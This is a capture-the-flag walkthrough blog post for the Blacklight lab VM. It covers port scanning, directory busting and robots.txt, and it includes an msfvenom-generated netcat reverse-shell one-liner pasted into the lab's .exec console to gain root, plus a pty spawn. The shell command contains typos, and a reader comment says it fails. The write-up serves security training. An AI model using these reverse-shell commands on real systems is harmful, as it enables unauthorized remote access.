@@ -1,0 +1,423 @@
+
+								
+																		Hack the Blacklight: 1 (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on July 22, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello everyone. In this article, we’ll be hacking a new lab Blacklight. The motto of the lab is to capture 2 flags. It is made by Carter B (downloadable from here) and after a lot of brainstorming, we are presenting before you a really efficient method to get root and capture the flags.
+Steps involved:
+
+Network discovery and port scan
+Directory busting the server
+Accessing robots.txt on the webpage
+Capturing flag 1 from robots.txt and discovery of a new port 9072
+Connection to port 9072 to upload a netcat reverse shell
+Getting root access and capturing the second flag
+
+Let’s get started then.
+First and foremost, we’ll discover the IP address of the lab. In my case, the IP is 192.168.1.102
+
+Let’s scan all the open ports with the most popular tool nmap. A simple nmap might show fewer ports open so we try the all ports scan:
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A  192.168.1.102 --open
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A  192.168.1.102 --open
+					
+				
+			
+		
+
+
+We discovered that port 80 is open. So there must be a webpage associated with it. Let’s move towards our browser and check the website.
+
+There seems nothing interesting here! But wait… maybe there are some directories that could have something valuable for us.
+Let’s do a directory buster scan over the IP then.
+
+		
+		
+			
+			
+			
+			
+dirb http://192.168.1.102
+			
+				
+					
+				
+					1
+				
+						dirb http://192.168.1.102
+					
+				
+			
+		
+
+
+We observed that robots.txt is available here. It surely would have some information or some directories that could be beneficial. Let’s go over to our browser and access this.
+
+Boom! There it is! Our very first flag. Let’s see what’s in there.
+
+We have got a hash as flag1. But the next flag is unknown. But wait, the second line of this file says 9072! So, it has something to do with 9072 port and “the secret is at home” means only one thing–the next flag is at home. But to access home, we’ll have to be rooted.
+There is another dictionary file present here but the current use of it is unknown.
+Holding that thought, let’s go ahead and try connecting to port 9072 with telnet.
+
+We successfully connected to a console but there is a restriction provided by the author here. We cannot execute more than 2 commands in this console! As soon as we hit 2 commands the server will quit and the listener won’t accept a connection again.
+So, the first command that we type is .help, it will show us a list of things that we can do:
+
+		
+		
+			
+			
+			
+			
+.readhash
+.exec
+.quit
+			
+				
+					
+				
+					123
+				
+						.readhash.exec.quit
+					
+				
+			
+		
+
+The obvious choice was .readhash but here is another fish! It is of no use! Just like the dictionary provided in robots.txt was of no use!
+Now, we’ll try and upload a reverse netcat shell over the command line interface using msfvenom:
+
+		
+		
+			
+			
+			
+			
+msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.120 lport=4444 R
+			
+				
+					
+				
+					1
+				
+						msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.120 lport=4444 R
+					
+				
+			
+		
+
+
+Copy the raw code provided (mkfinfo /tmp/cdbe; nc 192.168.1.120 4444 0&lt;/tmp/cdbe | /bin/sh &gt;tmp/cdbe 2&gt;&amp;1; rm /tmp/cdbe)
+We’ll paste this code in the blacklight console using the .exec command:
+
+		
+		
+			
+			
+			
+			
+.exec mkfinfo /tmp/cdbe; nc 192.168.1.120 4444 0&lt;/tmp/cdbe | /bin/sh &gt;tmp/cdbe 2&gt;&amp;1; rm /tmp/cdbe
+			
+				
+					
+				
+					1
+				
+						.exec mkfinfo /tmp/cdbe; nc 192.168.1.120 4444 0&lt;/tmp/cdbe | /bin/sh &gt;tmp/cdbe 2&gt;&amp;1; rm /tmp/cdbe
+					
+				
+			
+		
+
+
+The unique thing about this console is that the output of any command will never be shown. It all will happen in the background and then you’ll have to manually dump it. But let’s not go there as there is no need.
+Side by side, let’s set up a netcat listener over port 4444 for the payload we just inserted.
+
+AND WE HAVE A CONNECTION!
+
+		
+		
+			
+			
+			
+			
+whoami
+			
+				
+					
+				
+					1
+				
+						whoami
+					
+				
+			
+		
+
+Told us we are in root.
+But this is not a proper shell. Let us spawn a pty shell using the python command:
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+And we have a proper shell now!
+Remember what flag1.txt told us? The secret is at home!
+
+		
+		
+			
+			
+			
+			
+cd /home
+ls
+cd blacklight
+ls
+			
+				
+					
+				
+					1234
+				
+						cd /homelscd blacklightls
+					
+				
+			
+		
+
+We found a text file called hash.txt!
+cat hash.txt
+
+We examined the home directory one more time. We found a directory called a secret! Remember when flag1.txt told us that the secret is in the home? Let’s check what is inside the .secret directory.
+We obtained an image file called “flag2-inside.jpg” 
+
+
+
+		
+		
+			
+			
+			
+			
+cd /home
+cd blacklight
+ls -la
+cd .secret
+			
+				
+					
+				
+					1234
+				
+						cd /homecd blacklightls -lacd .secret
+					
+				
+			
+		
+
+
+
+It is obvious from the name of the file that the flag is inside this image. So, lets copy it inside the /var/www/html directory.
+
+
+
+		
+		
+			
+			
+			
+			
+cp flag2-inside.jpg /var/www/html
+			
+				
+					
+				
+					1
+				
+						cp flag2-inside.jpg /var/www/html
+					
+				
+			
+		
+
+
+
+
+Let us run this on the web page now! Hmmmm… Why are these two words capitalized?
+Wait! There is a tool called OUTGUESS!
+
+
+
+Let’s download this image on the Desktop and use outguess to copy the flag hidden in a file called flag2.txt
+
+
+
+		
+		
+			
+			
+			
+			
+./outguess -r /root/Desktop/flag2-inside.jpg -t flag2.txt
+cat flag2.txt
+			
+				
+					
+				
+					12
+				
+						./outguess -r /root/Desktop/flag2-inside.jpg -t flag2.txtcat flag2.txt
+					
+				
+			
+		
+
+
+
+Finally! We obtained the second flag! Happy Hacking!
+
+
+Author: Harshit Rajpal is an InfoSec researcher and a left and right brain thinker. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Harshit Shukla July 25, 2018 at 7:31 pm							
+							
+							
+														
+							
+								hey Raj the mfvenom command and nc  reverse shell command is not working please help
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								Matteo August 20, 2018 at 9:46 am							
+							
+							
+														
+							
+								blacklight.dict is useful to crack the hash password for user “blacklight”..
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
